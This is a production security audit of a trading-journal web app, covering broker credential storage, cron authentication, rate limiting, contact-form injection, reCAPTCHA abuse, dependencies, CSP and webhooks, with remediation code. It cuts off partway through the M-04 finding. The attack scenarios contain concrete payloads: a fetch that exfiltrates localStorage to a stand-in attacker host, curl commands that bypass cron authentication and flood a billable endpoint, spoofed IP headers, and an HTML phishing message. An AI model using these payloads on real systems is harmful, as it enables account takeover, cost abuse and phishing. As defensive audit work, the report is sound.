# xaujournal — Production Security Audit

**Date:** 2026-08-16 · **Branch:** `staging` · **Reviewer:** senior security engineering pass
**Scope:** Vercel API routes (`api/`), Firebase Cloud Functions (`functions/`), Firestore & Storage rules, client auth flows (`src/`), edge configuration (`vercel.json`), dependency tree.
**Method:** Static source review of the full server surface and the client auth/entitlement paths. No traffic was sent to production — items marked **[verify]** need one live check, and the exact command is given.

---

> ## ✅ Remediation status — all findings addressed in code
>
> Every finding below has been fixed, with the exception of items that are
> console configuration rather than code (called out individually). The
> codebase state after remediation:
>
> - **`npm audit --omit=dev`: 0 vulnerabilities** (was 1 critical, 4 high)
> - **162 tests passing** (was 119) — 43 new cases assert that each specific
>   attack described here is now refused
> - **Lint and production build clean**
>
> **Requires your action outside the repo** — these cannot be fixed by code:
> 1. **Rotate any broker password** stored by an affected user (C-01 was a real
>    credential exposure).
> 2. **Enable Firebase App Check**, MFA on admin accounts, email enumeration
>    protection, and a 12-char password policy in the Firebase console (H-06,
>    M-06). See `docs/SECRETS.md` → *Console-side configuration*.
> 3. **Grant yourself the `admin` custom claim** — the hardcoded UID in
>    `firestore.rules` is gone, so admin access is claim-based now (M-06).
>    Command in `docs/SECRETS.md` → *Admin access*.
> 4. **Set `RECAPTCHA_API_KEY`** to activate bot protection on `/api/contact`.
> 5. **Deploy the rules**: `firebase deploy --only firestore:rules`.
>
> **Two deliberate deferrals**, both documented inline:
> - `REQUIRE_EMAIL_VERIFICATION` defaults **off**. Enforcing it immediately
>   would lock existing Pro users out of broker sync mid-subscription, since
>   accounts predating verification carry `email_verified: false`. Prompt
>   users, then flip it.
> - CSP still allows `'unsafe-inline'` in the **enforced** policy; the strict
>   policy ships as `Content-Security-Policy-Report-Only` so violations surface
>   in devtools before enforcement. `'unsafe-eval'` was removed outright.

---

## Executive summary

The codebase shows real security effort: server-verified ID tokens on every user route, Firestore rules with schema validation, timing-safe cron comparison, credential scrubbing, circuit breakers, and sanitised error responses. The gaps are not sloppiness — they are **five structural weaknesses** where a control was designed but lands one layer short of where the trust boundary actually is.

| # | Theme | Worst case | Fix shipped |
|---|---|---|---|
| 1 | Broker trading passwords live in `localStorage` and survive sign-out | Full broker account takeover; attacker can trade the victim's live money | `src/lib/brokerCredentials.js` — split store, session-scoped secret, sign-out purge, legacy strip |
| 2 | Two cron routes authenticate against `"Bearer undefined"` if the secret is unset | Unauthenticated mass subscription revocation | `assertCron()` in `api/_security.ts`, used by all three handlers |
| 3 | Cloud Functions duplicate the broker path with no plan check and no rate limit | Any free account drains the MetaApi budget | `functions/` deleted; `firebase.json` block removed |
| 4 | Rate limiting keys on a client-suppliable header | Every quota in the app becomes unbounded | `api/_ipUtils.ts` — platform header, rightmost XFF |
| 5 | Entitlements and abuse controls enforced in React, not on the server | Paid features unlocked from devtools | `firestore.rules` — allowlist replaces denylist |

**Counts:** 1 Critical · 7 High · 9 Medium · 8 Low/Informational.

**Fix first (this week):** C-01, H-01, H-02, H-03, H-04. — *all shipped.*

---

# CRITICAL

## C-01 — Broker MT4/MT5 passwords stored in plaintext `localStorage`, never cleared at sign-out

**Severity:** Critical · **CWE-522 / CWE-312** (Insufficiently Protected Credentials / Cleartext Storage)
**Location:** [`src/hooks/useBrokerAccounts.js:106-107`](src/hooks/useBrokerAccounts.js#L106), [`src/firebase.js:46-58`](src/firebase.js#L46)

```js
// useBrokerAccounts.js:106
const newAccount = { id: result.accountId, accountName, platform: brokerType,
                     server, login, password, managedByWorker: true };
localStorage.setItem(localKey, JSON.stringify([newAccount]));
```

The architecture decision to keep broker credentials off the server is defensible and well documented. The execution has three defects:

1. **Plaintext at rest.** The MT4/MT5 *trading* password (not the read-only investor password) sits in `localStorage`, readable by any JavaScript on the origin and by anyone with filesystem access to the browser profile.
2. **Survives sign-out.** `signOutAndClearCache()` clears the Firestore IndexedDB cache and `xau-auth-hint`, and its own doc-comment explains exactly why that matters on a shared machine — but it never removes `xau-broker-accounts-${uid}`. The credential outlives the session it belongs to.
3. **Survives account deletion.** Nothing clears the key on account closure.

The CSP (`M-01`) permits `'unsafe-inline'` and `'unsafe-eval'`, so a single XSS anywhere on the origin reads this in one line.

### Attack scenarios

**A — Shared/library machine.** Victim connects a broker, signs out, walks away. Attacker opens devtools → `localStorage` → reads login, password, and server. The MT5 trading password grants order placement, not just read access: the attacker logs into the victim's live account and trades or drains it.

**B — XSS chain.** Any injection on `www.xaujournal.com` (a vulnerable dependency, a future `dangerouslySetInnerHTML`, a compromised npm package in the client bundle) becomes broker takeover:
```js
fetch('https://attacker.tld/x', {method:'POST', body: JSON.stringify(localStorage)})
```
`'unsafe-inline'` means CSP does not stop the injected script, and `connect-src` gaps do not stop exfiltration via `navigator.sendBeacon` to an allowed host or via an image beacon.

**C — Malicious extension / infostealer.** Commodity infostealer malware harvests browser `localStorage` by default. Broker credentials in that store are a direct financial-loss path with no further work by the attacker.

### Fix

The correct long-term design is: **never persist the trading password at all.** Prompt for it per sync, hold it in React state for the lifetime of the request, and discard it.

```js
// useBrokerAccounts.js — persist metadata only, never the secret
async function addAccount(login, password, server, brokerType, accountName) {
  const user = auth.currentUser;
  if (!user) throw new Error('Not authenticated');
  const result = await repository.connectBroker({
    accountId: login, password, server, platform: brokerType,
  });
  // password is deliberately NOT included
  const account = { id: result.accountId, accountName, platform: brokerType, server, login };
  localStorage.setItem(`xau-broker-accounts-${user.uid}`, JSON.stringify([account]));
  return result;
}

async function syncAccount(accountId, password) {   // password now a required argument
  if (!password) throw new Error('Enter your broker password to sync.');
  const account = accounts.find((a) => a.id === accountId);
  return repository.syncBrokerTrades({
    accountId: account.id, login: account.login, password,
    server: account.server, brokerType: account.platform,
  });
}
```

If a "remember for this session" affordance is required for UX, use `sessionStorage` (dies with the tab) and never `localStorage`.

**Ship immediately regardless of the above**, so existing stored credentials are purged on the next sign-out:

```js
// src/firebase.js
export async function signOutAndClearCache() {
  const uid = auth.currentUser?.uid;
  localStorage.removeItem('xau-auth-hint');
  if (uid) localStorage.removeItem(`xau-broker-accounts-${uid}`);
  // Defence in depth: purge any account blob left by another identity.
  Object.keys(localStorage)
    .filter((k) => k.startsWith('xau-broker-accounts-'))
    .forEach((k) => localStorage.removeItem(k));
  await auth.signOut();
  /* …existing cache teardown… */
}
```

Add a one-time migration on app boot that strips the `password` field from any existing stored blob, and notify affected users to rotate their broker password — under most regimes this is a reportable credential exposure. `src/pages/PrivacyPolicyPage.jsx:39` currently tells users this storage is safe; update it once the fix ships.

---

# HIGH

## H-01 — Cron routes authenticate successfully against `"Bearer undefined"` when `CRON_SECRET` is unset

**Severity:** High · **CWE-1188 / CWE-287** (Insecure Default / Improper Authentication)
**Location:** [`api/[[...route]].ts:1049-1058`](api/[[...route]].ts#L1049) (`remind-expiry`), [`api/[[...route]].ts:1108-1117`](api/[[...route]].ts#L1108) (`revoke-expired`)

```ts
const providedAuth = c.req.header('Authorization') || ''
const expectedAuth = `Bearer ${process.env.CRON_SECRET}`   // ← "Bearer undefined" if unset
const providedHash = crypto.createHash('sha256').update(providedAuth).digest()
const expectedHash = crypto.createHash('sha256').update(expectedAuth).digest()
if (!crypto.timingSafeEqual(providedHash, expectedHash)) return c.json({ error: 'Unauthorized' }, 401)
```

The comparison itself is correct — hashing first equalises length, so `timingSafeEqual` is used properly. The defect is the **absent-secret case**. With `CRON_SECRET` missing, `expectedAuth` is the literal string `"Bearer undefined"`, and any attacker sending that exact header authenticates.

The third cron handler gets this right (`api/[[...route]].ts:969`: `if (!expectedSecret) return c.json({ error: 'Cron secret is not configured' }, 503)`). The other two simply missed the guard — which is what makes this a latent bug rather than a deliberate trade-off.

### Attack scenario

`CRON_SECRET` is absent for any of the ordinary reasons: a new Preview/Development environment created without it, a secret rotation with a gap, an env var scoped to Production only while a preview deployment is publicly reachable. The attacker then runs:

```bash
curl -X POST https://<deployment>.vercel.app/api/cron/revoke-expired \
  -H "Authorization: Bearer undefined"
```

`revoke-expired` deletes every matching user's API keys and force-downgrades them to `plan: 'free'` (`api/[[...route]].ts:1133-1150`). Repeated against `remind-expiry`, it blasts email to your entire Pro user base from your verified domain — a deliverability and reputation incident on top of the data damage.

### Fix

Extract one guard and use it in all three handlers.

```ts
function assertCron(c: any): Response | null {
  const expected = process.env.CRON_SECRET
  if (!expected || expected.length < 32) {
    console.error('[cron] CRON_SECRET missing or too short — refusing to run')
    return c.json({ error: 'Cron secret is not configured' }, 503)
  }
  const header = c.req.header('Authorization') || ''
  const provided = header.startsWith('Bearer ') ? header.slice(7) : (c.req.header('x-cron-secret') || '')
  const a = crypto.createHash('sha256').update(provided).digest()
  const b = crypto.createHash('sha256').update(expected).digest()
  if (!crypto.timingSafeEqual(a, b)) return c.json({ error: 'Unauthorized' }, 401)
  return null
}

const handleRevokeExpired = async (c: any) => {
  const denied = assertCron(c); if (denied) return denied
  /* … */
}
```

Add a build-time or boot-time assertion that `CRON_SECRET`, `FIREBASE_SERVICE_ACCOUNT`, `LEMON_SQUEEZY_WEBHOOK_SECRET`, `METAAPI_TOKEN`, and `RESEND_API_KEY` are present in Production, and fail the deploy if they are not. Silent absence is the shared root cause of this finding and several below.

---

## H-02 — Cloud Functions expose the broker path with no subscription check and no rate limit

**Severity:** High · **CWE-862** (Missing Authorization) · **[verify]**
**Location:** [`functions/index.js:269-338`](functions/index.js#L269)

```js
exports.connectBroker = onCall({ secrets: [metaApiTokenSecret], timeoutSeconds: 540, memory: '1GiB' },
  async (request) => {
    const uid = requireAuth(request);          // ← authentication only
    const { server, accountId, password, platform = 'mt5' } = request.data || {};
    // no isSyncAllowed() / plan check, no rate limit, no lock
    const count = await transientSyncTrades(uid, server, accountId, password, platform);
```

The Vercel route enforces the paywall correctly (`api/[[...route]].ts:496`: `if (!isSyncAllowed(userData)) return 403`). These callables are the **older duplicate of the same capability** and enforce only "is signed in". The client no longer calls them — there is no `httpsCallable` anywhere in `src/`; `src/lib/brokerSync.js` posts to `/api/*` instead. Dead client code does **not** make a deployed callable unreachable: Firebase callables are plain HTTPS endpoints invokable by any authenticated user with a Firebase ID token.

Each invocation calls `provisioningApi.createAccount()` → `deploy()` → `waitConnected()`, provisioning a **billable cloud MT5 instance** on MetaApi.

### Attack scenario

Attacker signs up for a free account (no email verification required — see `M-05`), obtains an ID token, and loops:

```bash
for i in $(seq 1 500); do
  curl -s "https://asia-southeast1-xaujournal29.cloudfunctions.net/connectBroker" \
    -H "Authorization: Bearer $ID_TOKEN" -H "Content-Type: application/json" \
    -d '{"data":{"server":"X","accountId":"1","password":"p","platform":"mt5"}}' &
done
```

With `timeoutSeconds: 540` and `maxInstances: 10`, ten concurrent 9-minute provisioning attempts saturate the function pool and burn MetaApi account-provisioning spend. There is no plan gate, no per-user throttle, and no lock (unlike the Vercel path, which uses `withAccountLock`).

**Verify deployment status first:**
```bash
firebase functions:list --project xaujournal29
```

### Fix

If the callables are genuinely superseded — which the code indicates — **delete them.**

```bash
firebase functions:delete connectBroker syncBrokerTrades disconnectBroker \
  --region asia-southeast1 --project xaujournal29
```

Then remove `functions/index.js` and drop the `functions` block from `firebase.json`, so the surface cannot be resurrected by a stray `firebase deploy`. If you must keep them, port the three controls the Vercel path already has:

```js
const { isSyncAllowed } = require('./auth');   // share one implementation

exports.connectBroker = onCall({ secrets: [metaApiTokenSecret], timeoutSeconds: 540 },
  async (request) => {
    const uid = requireAuth(request);
    const snap = await db.collection('users').doc(uid).get();
    if (!isSyncAllowed(snap.data())) {
      throw new HttpsError('permission-denied', 'Broker sync requires an active Pro subscription.');
    }
    const lock = await db.collection('users').doc(uid).collection('locks').doc('brokerConnect');
    // reject if a sync started in the last 60s, then proceed
```

**Systemic note:** two independent implementations of one privileged capability, with the paywall on only one, is the pattern that produced this finding. Delete the loser rather than maintaining both.

---

## H-03 — Rate limiting keys on a client-suppliable header

**Severity:** High · **CWE-807 / CWE-290** (Reliance on Untrusted Input / Spoofing) · **[verify]**
**Location:** [`api/_ipUtils.ts:6-17`](api/_ipUtils.ts#L6), consumed by [`api/_middleware.ts:52-55`](api/_middleware.ts#L52)

```ts
export function getClientIp(c: Context): string {
  const xRealIp = c.req.header('x-real-ip')          // ← trusted unconditionally
  if (xRealIp) return xRealIp
  const xForwardedFor = c.req.header('x-forwarded-for')
  if (xForwardedFor) return xForwardedFor.split(',')[0].trim()   // ← leftmost = client-controlled
  return '127.0.0.1'
}
```

Two unsafe patterns: the function trusts `x-real-ip` with no provenance check, and falls back to the **leftmost** `x-forwarded-for` entry — the classic spoofable position, since proxies *append* and the client controls everything before the first trusted hop. Neither reads Vercel's authoritative `x-vercel-forwarded-for`.

Whether a client-supplied `X-Real-IP` currently survives Vercel's edge depends on platform normalisation, which is not guaranteed by this code and would change silently on a platform migration or a self-hosted deploy. Treat it as broken until proven otherwise:

```bash
# Two requests with different spoofed IPs. If X-RateLimit-Remaining resets rather
# than decrementing, the limiter is keyed on attacker-controlled input.
curl -s -D- -o /dev/null https://www.xaujournal.com/api/spot-price/XAU -H 'X-Real-IP: 1.2.3.4' | grep -i ratelimit
curl -s -D- -o /dev/null https://www.xaujournal.com/api/spot-price/XAU -H 'X-Real-IP: 5.6.7.8' | grep -i ratelimit
```

### Attack scenario

`rateLimitMiddleware` is the **only** abuse control on every unauthenticated endpoint. Defeat it and each of these becomes unbounded: `/api/contact` (H-04), the reCAPTCHA proxy (H-05), `/api/vitals`, and the market-data proxies. A rotating `X-Real-IP` per request gives every request a fresh bucket and a fresh `rl:` key in Vercel KV — which is itself billed per operation, so the limiter becomes a cost amplifier.

### Fix

```ts
export function getClientIp(c: Context): string {
  // Vercel's edge sets this and strips any client-supplied copy — it is the only
  // header here whose value the client cannot influence.
  const vercel = c.req.header('x-vercel-forwarded-for')
  if (vercel) return vercel.split(',')[0].trim()

  // Fallback: take the RIGHTMOST entry, i.e. the address our own trusted proxy
  // observed, rather than the leftmost value the caller prepended.
  const xff = c.req.header('x-forwarded-for')
  if (xff) {
    const parts = xff.split(',').map((s) => s.trim()).filter(Boolean)
    if (parts.length) return parts[parts.length - 1]
  }
  return 'unknown'
}
```

Note the `'127.0.0.1'` default also merges every header-less caller into one shared bucket. Prefer `'unknown'` and treat it as its own scope.

Additionally, key authenticated endpoints on `uid` rather than IP — IP is the wrong identity for a signed-in user and is trivially rotated via mobile networks or proxies.

---

## H-04 — Unauthenticated `/api/contact` writes to Firestore, sends email, and injects raw HTML into the ops inbox

**Severity:** High · **CWE-80 / CWE-770** (HTML Injection / Unbounded Resource Allocation)
**Location:** [`api/[[...route]].ts:177-225`](api/[[...route]].ts#L177)

```ts
const { name, email, subject, message } = body
if (!name || !email || !message) return c.json({ error: 'Missing required fields…' }, 400)
await db.collection('contactMessages').add({ name, email, subject: subject || 'No Subject', message, createdAt: now() })
await resend.emails.send({
  to: 'info@xaujournal.com',
  subject: `[Contact Form] ${subject || 'New Message'}`,
  html: `… <p><strong>Name:</strong> ${name}</p> …
         <p style="…">${message}</p> …`      // ← raw interpolation
})
```

No authentication, no CAPTCHA, no length caps, no email-format validation, and **no HTML escaping** on any of the four attacker-controlled fields before they land in an email your team reads.

### Attack scenarios

**A — Phishing from your own domain.** The message body is injected verbatim, and the mail is DKIM-signed by `xaujournal.com`:

```json
{ "name":"Ops", "email":"a@b.c", "subject":"Alert",
  "message":"<div style=\"font-family:sans-serif\"><h2>Firebase security alert</h2><p>Unusual admin access detected. <a href=\"https://xaujourna1.com/reauth\">Re-authenticate now</a></p></div>" }
```

Your support inbox receives a styled, domain-authenticated "security alert". Mail clients strip `<script>` but honour links, styling, and layout — which is all a credential-phishing page needs. If `contactMessages` is ever rendered in an admin UI, the same payload becomes stored XSS against an admin session.

**B — Resource exhaustion.** Combined with `H-03`, an attacker submits unbounded documents to `contactMessages` (`message` has no size cap — up to the ~1 MiB Firestore document limit each) while exhausting your Resend send quota and flooding the inbox. Legitimate support mail is lost in the noise.

**C — Header/subject smuggling.** `subject` flows unvalidated into the email `subject` field.

### Fix

```ts
const escapeHtml = (s: unknown) => String(s)
  .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
  .replace(/"/g, '&quot;').replace(/'/g, '&#39;')

app.post('/contact', async (c) => {
  const body = await c.req.json().catch(() => null)
  if (!body) return c.json({ error: 'Invalid JSON body' }, 400)

  const name    = String(body.name    ?? '').trim().slice(0, 120)
  const email   = String(body.email   ?? '').trim().slice(0, 254)
  const subject = String(body.subject ?? '').trim().slice(0, 200).replace(/[\r\n]/g, ' ')
  const message = String(body.message ?? '').trim().slice(0, 5000)

  if (!name || !email || !message) return c.json({ error: 'Missing required fields' }, 400)
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) return c.json({ error: 'Invalid email' }, 400)

  // Require a passing reCAPTCHA assessment — see H-05.
  if (!(await verifyRecaptcha(body.recaptchaToken, 'contact'))) {
    return c.json({ error: 'Verification failed' }, 403)
  }

  await db.collection('contactMessages').add({
    name, email, subject: subject || 'No Subject', message,
    ip: getClientIp(c), createdAt: now(),
  })

  await resend.emails.send({
    from: 'XauJournal Contact Form <contact@xaujournal.com>',
    to: 'info@xaujournal.com',
    replyTo: email,
    subject: `[Contact Form] ${subject || 'New Message'}`,
    text: `Name: ${name}\nEmail: ${email}\nSubject: ${subject}\n\n${message}`,  // plaintext — no injection surface
    html: `<div style="font-family:sans-serif;padding:20px;color:#1e293b">
             <h2>New Contact Form Message</h2>
             <p><strong>Name:</strong> ${escapeHtml(name)}</p>
             <p><strong>Email:</strong> ${escapeHtml(email)}</p>
             <p style="white-space:pre-wrap;background:#f1f5f9;padding:15px;border-radius:6px">${escapeHtml(message)}</p>
           </div>`,
  })
  return c.json({ success: true })
})
```

Add a dedicated rate-limit scope for `/contact` (e.g. 5/hour) in `_middleware.ts` — the shared 100/min `api` bucket is far too generous for a human-driven form.

---

## H-05 — Unauthenticated reCAPTCHA proxy burns billable assessment quota

**Severity:** High · **CWE-770**
**Location:** [`api/[[...route]].ts:134-172`](api/[[...route]].ts#L134)

The `action: 'recaptcha'` branch of `/api/auth-utils` takes an **arbitrary caller-supplied `token`**, requires no authentication, and forwards it to reCAPTCHA Enterprise using your server-side `RECAPTCHA_API_KEY`. Every call is a billed assessment above the free tier. Chained with `H-03` it is an unbounded, anonymous charge on your Google Cloud account.

Two secondary defects in the same block:

- **The API key travels in the URL query string** (`?key=${process.env.RECAPTCHA_API_KEY}`, line 147). Query strings are recorded in proxy logs, error traces, and APM spans. Move it to the `X-Goog-Api-Key` header.
- **A hardcoded site key** is embedded as a fallback (line 152). Site keys are public by design so this is not a leak, but a silent fallback means a missing env var produces confusing failures instead of a loud one.

### Fix

Make verification a **server-side helper**, not an endpoint. The verdict should never round-trip through the client (see `H-06`).

```ts
export async function verifyRecaptcha(token: string, expectedAction: string): Promise<boolean> {
  const apiKey = process.env.RECAPTCHA_API_KEY
  const siteKey = process.env.VITE_RECAPTCHA_SITE_KEY
  if (!apiKey || !siteKey) { console.error('[recaptcha] not configured'); return false }  // fail closed
  if (!token) return false

  const projectId = process.env.VITE_FIREBASE_PROJECT_ID || 'xaujournal29'
  const res = await fetch(
    `https://recaptchaenterprise.googleapis.com/v1/projects/${projectId}/assessments`,
    { method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-Goog-Api-Key': apiKey },  // not the query string
      body: JSON.stringify({ event: { token, siteKey, expectedAction } }) },
  )
  if (!res.ok) return false
  const data: any = await res.json()
  return data?.tokenProperties?.valid === true
      && data?.tokenProperties?.action === expectedAction   // pin the action — prevents token reuse across flows
      && (data?.riskAnalysis?.score ?? 0) >= 0.5
}
```

Then **delete the `action === 'recaptcha'` branch entirely** and call `verifyRecaptcha()` inline from `/contact` and the signup path.

---

## H-06 — No bot protection on signup or login; the reCAPTCHA integration is never invoked

**Severity:** High · **CWE-307** (Improper Restriction of Excessive Authentication Attempts)
**Location:** [`src/Login.jsx`](src/Login.jsx) (entire file), [`api/[[...route]].ts:134`](api/[[...route]].ts#L134)

A grep across `src/` for `recaptcha`, `reCAPTCHA`, and `grecaptcha` returns **zero matches**. The server-side verification path in `H-05` exists but no client ever calls it. `handleEmailAuth` and `handleGoogle` call Firebase Auth directly with no challenge of any kind.

Compounding factors:

- Firebase Auth calls go **browser → Google directly**, so your Vercel rate limiter never sees them. `rateLimitMiddleware` cannot help here.
- No email verification is required or requested anywhere (`M-05`).
- Each successful signup creates a Firestore user document and triggers a Resend email (`M-08`).

### Attack scenario

**Credential stuffing.** A breach-corpus list is replayed against `signInWithEmailAndPassword` at full speed, bounded only by Firebase's default per-project quotas. Successful logins yield trading history, P&L, and — via `C-01` on the victim's own device — broker credentials.

**Mass account creation.** A script registers thousands of accounts, each writing a user document and firing a login-alert email. Firestore and Resend costs scale linearly with the attacker's effort.

### Fix

1. **Enable Firebase App Check** with reCAPTCHA Enterprise as the attestation provider, and set enforcement on Authentication, Firestore, and Storage. This is the control that actually covers the direct browser→Google path, which nothing in your own infrastructure can see.
2. Load reCAPTCHA Enterprise in `Login.jsx` and pass the token to a server-side gate for the signup flow, verified with the `H-05` helper.
3. In the Firebase console, enable **email enumeration protection** and configure a password policy (minimum 12 characters, no leading/trailing whitespace). Today the only floor is Firebase's 6-character default.
4. Enable Identity Platform's **multi-factor authentication** for accounts holding `plan: 'pro'`, and require it for the admin identity in `M-06`.

---

## H-07 — Vulnerable dependencies: 1 critical, 4 high

**Severity:** High · **CWE-1395**
**Location:** [`package.json`](package.json), [`package-lock.json`](package-lock.json)

`npm audit --production` on the current lockfile:

| Package | Installed | Severity | Advisory |
|---|---|---|---|
| `websocket-driver` | ≤0.7.4 | **Critical** | Resource-limit bypass via message compression; message corruption via length headers |
| `react-router` / `react-router-dom` | 7.17.0 | **High** | [GHSA-wrjc-x8rr-h8h6](https://github.com/advisories/GHSA-wrjc-x8rr-h8h6) open redirect via backslash in `<Link>`/`useNavigate` (CVE-2025-68470 bypass); [GHSA-h8fp-f39c-q6mh](https://github.com/advisories/GHSA-h8fp-f39c-q6mh) RSCErrorHandler missing protocol validation (XSS) |
| `hono` | 4.12.22 | **High** | Body-limit middleware bypass via understated `Content-Length` |
| `socket.io-parser` | <3.3.6 | **High** | Zero-attachment memory exhaustion |
| `brace-expansion` | — | **High** | ReDoS via consecutive non-expanding groups |
| `protobufjs` | — | Moderate | Infinite loop in `.proto` option parsing |

**react-router is the one that matters most.** It ships in the client bundle and the open-redirect advisory is directly weaponisable: an attacker crafts `https://www.xaujournal.com/…?redirect=/\evil.tld`, the backslash defeats the same-origin check, and the victim lands on an attacker page having arrived from your genuine domain — which is exactly the credibility a phishing page needs, and it pairs naturally with `H-04`.

`websocket-driver` and `socket.io-parser` are transitive through `metaapi.cloud-sdk` and are server-side only, which narrows but does not eliminate exposure.

### Fix

```bash
npm audit fix                      # clears websocket-driver, socket.io-parser, brace-expansion
npm install react-router-dom@latest   # must reach >7.18.1
npm install hono@latest
npm audit --production             # confirm clean
npm test
```

The `overrides` block in `package.json` already pins 15 transitive packages, so the practice is established — add any residual pins there. Then wire this into CI so it does not drift:

```yaml
# .github/workflows/security.yml
- run: npm audit --production --audit-level=high    # fails the build on high/critical
```

Enable Dependabot or Renovate for `npm` on this repo. Six advisories accumulated between deploys because nothing was watching.

---

# MEDIUM

## M-01 — CSP permits `'unsafe-inline'` and `'unsafe-eval'`

**Severity:** Medium (elevated by `C-01`) · **CWE-1021**
**Location:** [`vercel.json:85`](vercel.json#L85)

```
script-src 'self' 'unsafe-inline' 'unsafe-eval' https://*.google.com https://*.googleapis.com …
```

`'unsafe-inline'` removes essentially all XSS containment CSP would otherwise provide; `'unsafe-eval'` permits `eval()` and `new Function()`. The wildcard `https://*.google.com` is also broad enough to include user-content-hosting subdomains.

The rest of the header set is genuinely good — HSTS with preload, `nosniff`, `frame-ancestors 'self'`, a restrictive `Permissions-Policy`. This one directive undoes much of it, and it is the multiplier on `C-01`: with a strict CSP, an injected script cannot exfiltrate `localStorage` to an attacker host.

### Fix

Move to a nonce- or hash-based policy. Vite emits hashed module scripts and no inline `<script>` in the app shell — the only inline script in `index.html` is the `application/ld+json` block, which `script-src` does not govern. Test whether `'unsafe-inline'` can simply be dropped:

```
script-src 'self' https://www.gstatic.com/recaptcha/ https://www.google.com/recaptcha/ https://s.tradingview.com https://widget.tradingview.com https://s3.tradingview.com https://cdn.tradingview.com https://*.lemonsqueezy.com;
```

Drop `'unsafe-eval'` first — it is the easier win and rarely needed by this stack. Verify with `Content-Security-Policy-Report-Only` plus a `report-uri` for one release before enforcing. Also replace `X-XSS-Protection: 1; mode=block` with `X-XSS-Protection: 0`; the legacy auditor it enables has its own known bypass-and-injection issues and is ignored by every current browser.

---

## M-02 — API keys stored unhashed as Firestore document IDs

**Severity:** Medium · **CWE-256** (Plaintext Storage of a Password)
**Location:** [`api/[[...route]].ts:547-552`](api/[[...route]].ts#L547), [`api/_tradeService.ts:22`](api/_tradeService.ts#L22)

```ts
const apiKey = 'xau_' + crypto.randomBytes(24).toString('hex')
await db.collection('apiKeys').doc(apiKey).set({ uid, label: '…', createdAt: now() })
```

Entropy and generation are correct — 192 bits from a CSPRNG is not brute-forceable. The problem is storage: the **secret itself is the document ID**, so it appears in plaintext in the Firestore console, in every export and backup, in Cloud Audit Log resource names, and in any error message that includes a document path. Firestore rules correctly deny all client access (`allow read, write: if false`), but anyone with console access or a leaked backup gets live, working keys.

Also cached in Vercel KV in plaintext for 24 hours (`_tradeService.ts:18-27`), and cached authorisation means a revoked subscription keeps syncing for up to 10 minutes (`auth:sync-allowed`, line 37).

### Fix

Store a hash; index on it; show the plaintext key exactly once at creation.

```ts
const hashKey = (key: string) => crypto.createHash('sha256').update(key).digest('hex')

// Generation
const apiKey = 'xau_' + crypto.randomBytes(24).toString('hex')
await db.collection('apiKeys').doc(hashKey(apiKey)).set({
  uid, label: 'MT5/TradingView Sync Key', prefix: apiKey.slice(0, 12),  // for UI display only
  createdAt: now(), lastUsedAt: null,
})
return c.json({ apiKey })   // the only time the plaintext is ever emitted

// Resolution
export async function resolveKey(apiKey: string): Promise<string | null> {
  if (!apiKey || !apiKey.startsWith('xau_')) return null
  const id = hashKey(apiKey)
  const cached = await kv.get<string>(`auth:apikey:${id}`)   // cache the hash, never the key
  /* … */
}
```

Note both `/api/generate-api-key` and `/api/revoke-api-key` are currently unreferenced by the client (no call sites in `src/`) while remaining live. Either surface them in the UI or remove them — see `M-09`.

---

## M-03 — Lemon Squeezy webhook: non-constant-time signature check, no replay protection

**Severity:** Medium · **CWE-208 / CWE-294** (Observable Timing Discrepancy / Replay)
**Location:** [`api/[[...route]].ts:663-675`](api/[[...route]].ts#L663)

```ts
const digest = hmac.update(rawBody).digest('hex')
if (digest !== signature) { … return c.text('Invalid signature', 401) }
```

Two issues:

1. **`!==` is not constant-time.** Node's string comparison short-circuits on first mismatch. Remote timing attacks on HMAC comparison are difficult but this is a solved problem — the same file already uses `timingSafeEqual` correctly for cron secrets, so the inconsistency is the tell.
2. **No replay or idempotency protection.** The signature covers the body only, with no timestamp and no event-ID dedupe. A single captured valid request can be replayed indefinitely.

### Attack scenario

An attacker who observes one `subscription_created` webhook (via a logging misconfiguration, a proxy, an SSRF against an internal log store, or a compromised staging environment that shares the secret) can replay it verbatim after cancelling their subscription and re-grant themselves `plan: 'pro'` at will. The handler is a straight `set(..., {merge: true})` with no state check (line 716).

### Fix

```ts
const signature = c.req.header('x-signature') || ''
const rawBody = await c.req.text()
const digest = crypto.createHmac('sha256', secret).update(rawBody).digest('hex')

const a = Buffer.from(digest, 'utf8')
const b = Buffer.from(signature, 'utf8')
if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) {
  console.error('[lemon-squeezy-webhook] Signature verification failed')
  return c.text('Invalid signature', 401)
}

// Idempotency: process each event id at most once.
const eventId = c.req.header('x-event-id') || body.meta?.event_id || digest
const seen = await db.collection('webhookEvents').doc(eventId).get()
if (seen.exists) return c.json({ ok: true, deduped: true })
await db.collection('webhookEvents').doc(eventId).set({ processedAt: now(), event: eventName })
```

Give `webhookEvents` a 90-day Firestore TTL policy. Also validate that `body.meta.custom_data.user_id` is a well-formed Firebase UID before using it as a document path (line 680) — it currently flows straight into `db.collection('users').doc(userId)` from external input.

---

## M-04 — Firestore document-path injection via unvalidated `positionId`

**Severity:** Medium · **CWE-22** (Path Traversal)
**Location:** [`api/[[...route]].ts:855`](api/[[...route]].ts#L855) and [`:943`](api/[[...route]].ts#L943)

```ts
const tradeRef = db.collection('users').doc(uid).collection('trades').doc(`pos_${positionId}`)
```

`positionId` is checked for presence only — no type, length, or character validation. The Admin SDK's `.doc()` accepts a **slash-separated relative path**, so a payload such as `positionId = "a/deep/b"` resolves to `users/{uid}/trades/pos_a/deep/b` and writes into a nested subcollection that no part of the application knows about.

Firestore rejects `.` and `..` segments, so **cross-tenant escape is not possible** — writes stay inside the caller's own document tree. Two real consequences remain:

- **Incomplete erasure.** `/api/reset-trades` (`:892-903`) deletes only top-level `trades` documents. Subcollection documents survive a "reset all trades" and survive account deletion — a GDPR/CCPA right-to-erasure gap and a source of silent storage growth.
- **Unbounded write amplification.** A non-string `positionId` (an object, an array) reaches the SDK before validation, producing either an exception per request or arbitrary path construction.

The same route also accepts `symbol` and `comment` with only length checks, and every other field (`direction`, `lots`, `price`, `time`, `profit`, `commission`, `swap`) is passed straight through to `handleOpenTradeSync` / `handleCloseTradeSync` with no schema validation at all.

### Fix

```ts
const POSITION_ID = /^[A-Za-z0-9_-]{1,64}$/
const SYMBOL      = /^[A-Za-z0-9._-]{1,20}$/

function validateSyncPayload(body: any) {
  const positionId = String(body.positionId ?? '')
  const symbol     = String(body.symbol ?? '')
  if (!POSITION_ID.test(positionId)) throw new Error('invalid positionId')
